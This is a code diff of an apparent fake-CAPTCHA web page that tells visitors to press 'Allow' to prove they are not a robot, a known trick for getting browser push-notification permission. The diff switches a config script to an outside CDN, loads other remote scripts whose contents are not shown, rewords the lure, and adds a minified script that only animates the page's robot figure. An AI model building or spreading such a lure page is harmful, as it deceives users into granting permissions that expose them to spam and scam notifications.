@@ -6,11 +6,9 @@
 	<title id="title">Click Allow</title>
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1,minimum-scale=1">
-	<script src="./js/cfg.js"></script>
+	<script src="https://psh-static.b-cdn.net/cfg.js"></script>
 	<script src="https://psh-static.b-cdn.net/3.js"></script>
 	<script src="https://psh-static.b-cdn.net/2.js"></script>
-	<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
-	<script src="https://psh-static.b-cdn.net/1.js"></script>
 	<link href="https://psh-static.b-cdn.net/1.css" rel="stylesheet" type="text/css">
 	<style>
 
@@ -24,7 +22,7 @@
 			<div class="speech column scale" id="speech">
 				<div class="formOuterBox column show" id="formOuterBox">
 					<div class="formTitle" id="text1">
-						Click «Allow» to confirm that you are not a robot!
+						Press the "Allow" button to verify you're human!
 					</div>
 				</div>
 				<img alt="" class="speechCorner" src="https://psh-static.b-cdn.net/corner.png">
@@ -87,6 +85,9 @@
 		</div>
 	</div>
 </div>
+<script>
+document.addEventListener("DOMContentLoaded",(function(){I(),setInterval((function(){I()}),5e3);var e=document.getElementById("armLeft"),t=document.getElementById("armRight"),s=document.getElementById("eyeNormal"),i=document.getElementById("eyeBlink"),d=document.getElementById("rHeadBox"),m=document.getElementById("mouth1"),a=document.getElementById("mouth2"),n=document.getElementById("mouth3"),c=document.getElementById("rBodyBox"),o=!1;setInterval((function(){o?(c.classList.remove("rAnim"),d.classList.remove("rAnim"),o=!1):(c.classList.add("rAnim"),d.classList.add("rAnim"),o=!0)}),4e3),setInterval((function(){setTimeout((function(){s.classList.add("hide"),i.classList.add("showBlock")}),0),setTimeout((function(){s.classList.remove("hide"),i.classList.remove("showBlock")}),300)}),5e3);var l,r,L=0;function u(){clearInterval(l),clearTimeout(r),L=0,document.getElementById("mouth1").classList.remove("hide"),document.getElementById("mouth2").classList.remove("hide"),document.getElementById("mouth3").classList.remove("hide")}var h=!1,v=!1;function I(){if(l&&u(),l=setInterval((function(){0===L?(m.classList.add("hide"),a.classList.remove("hide"),n.classList.add("hide")):1===L?(m.classList.add("hide"),a.classList.add("hide"),n.classList.remove("hide")):2===L?(m.classList.add("hide"),a.classList.remove("hide"),n.classList.add("hide")):3===L&&(m.classList.remove("hide"),a.classList.add("hide"),n.classList.add("hide")),++L>3&&(L=0)}),170),r=setTimeout((function(){u()}),1701),!v){v=!0,document.getElementById("armRight").classList.add("armRightAnim"),document.getElementById("armLeft").classList.add("armLeftAnim"),h=!0;var s=setInterval((function(){h?(h=!1,t.classList.remove("armRightAnim"),e.classList.remove("armLeftAnim")):(h=!0,t.classList.add("armRightAnim"),e.classList.add("armLeftAnim"))}),250);setTimeout((function(){clearInterval(s),u(),t.classList.remove("armRightAnim"),e.classList.remove("armLeftAnim"),v=!1}),1750)}}}));
+</script>
 
 </body>
 </html>
